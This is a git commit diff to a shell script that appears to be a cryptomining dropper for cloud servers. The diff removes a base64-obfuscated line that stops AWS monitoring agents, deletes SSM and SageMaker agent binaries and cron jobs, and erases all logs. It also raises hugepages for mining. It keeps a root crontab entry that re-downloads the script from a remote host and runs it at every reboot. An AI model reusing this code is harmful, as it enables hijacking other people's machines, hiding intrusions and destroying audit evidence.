21ad1eb8de6e9991f8685e0613fedabda2bbb822
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-02 12:36:18 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -3,7 +3,6 @@
 mode="${1:-0}"
 src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
 
-bash -c "echo 'c2xlZXAgMTIwOyBzdWRvIHN5c3RlbWN0bCBkaXNhYmxlIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHN5c3RlbWN0bCBzdG9wIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHJtIC1yZiAvdXNyL2Jpbi9jb250YWluZXJkIC91c3IvYmluL3NzbS1hZ2VudC13b3JrZXIgL3Vzci9iaW4vYW1hem9uLXNzbS1hZ2VudCAvdXNyL3NiaW4vcm9sZS1hZ2VudCAvdXNyL2xpYmV4ZWMvcG9zdGZpeC9tYXN0ZXIgL29wdC9hd3MvYW1hem9uLWNsb3Vkd2F0Y2gtYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9jbGVhbi1qdXB5dGVyLWxvZyAvZXRjL29wdC9tbC9zY3JpcHRzL3NhZ2VtYWtlci1uYmktYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9yZXN0YXJ0LXNhZ2VtYWtlci1hZ2VudC13YXRjaGVyIC9ldGMvb3B0L21sL3NjcmlwdHMvcmVsYXVuY2gtZG9ja2VyLXNlcnZpY2UgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zYWdlbWFrZXItcm9sZS1wcm94eS1hZ2VudCAvZXRjL29wdC9tbC9zY3JpcHRzL3NldC11cC1hZ2VudC1uYW1lc3BhY2UgL3Vzci9zYmluL3NhbXBsZS1ub3RlYm9va3MtY29uZmlnIC9vcHQvLnNhZ2VtYWtlci9hZGRfY2xvdWRfd2F0Y2hfYWdlbnRfY29uZmlndXJhdGlvbi5weSAvZXRjL2Nyb24uZC8qIC9ldGMvY3Jvbi5kYWlseS8qIC9ldGMvY3Jvbi5ob3VybHkvKjsgc3VkbyBmaW5kIC92YXIvbG9nIC10eXBlIGYgLWRlbGV0ZTsK' |base64 -d |/bin/bash" >/dev/null 2>&1 &
 
 # Debian12+
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
@@ -15,7 +14,7 @@ addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/n
 [ -n "$addr" ] || addr="NULL"
 name="c${cores}_${addr}"
 
-sudo sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1
+sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
 sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 mkdir -p "/tmp/.config"
